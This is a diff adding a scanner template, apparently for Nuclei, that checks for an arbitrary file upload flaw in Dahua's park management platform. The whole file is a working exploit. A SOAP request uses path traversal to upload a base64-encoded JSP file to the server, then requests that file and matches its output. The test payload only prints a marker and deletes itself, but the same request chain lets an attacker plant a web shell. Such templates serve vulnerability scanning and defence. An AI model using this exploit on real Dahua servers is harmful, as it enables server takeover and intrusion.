@@ -1,0 +1,38 @@
+
+id: dahua-wpms-bitmap-upload
+info:
+  name: dahua-wpms-bitmap-upload
+  author: apple
+  severity: critical
+  description: 大华园区综合管理平台/emap/webservice/gis/soap/bitmap接口处存在任意文件上传漏洞，恶意攻击者可能会上传后门文件，造成服务器失陷.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0bitmap%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+ 
+http:
+  - raw:
+      - "POST /emap/webservice/gis/soap/bitmap HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
+        \ text/xml; charset=utf-8\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36\
+        \ (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\n\n<soapenv:Envelope\
+        \ xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"\
+        http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/\">\n    <soapenv:Header/>\
+        \           \n\t    <soapenv:Body>\n     \t\t    <res:uploadPicFile>\n   \
+        \                 <arg0>\n             \t    <picPath>/../{{filename}}.jsp</picPath>\n\
+        \                    </arg0>\n                    <arg1>PCUgIG91dC5wcmludGxuKCJ0ZXN0MTIzIik7bmV3ICBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICAlPg==</arg1>\n\
+        \                </res:uploadPicFile>\n\t\t</soapenv:Body>\n</soapenv:Envelope>"
+      - |-
+        GET /upload/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Content-Length: 54
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: word
+        part: body
+        words:
+          - test123
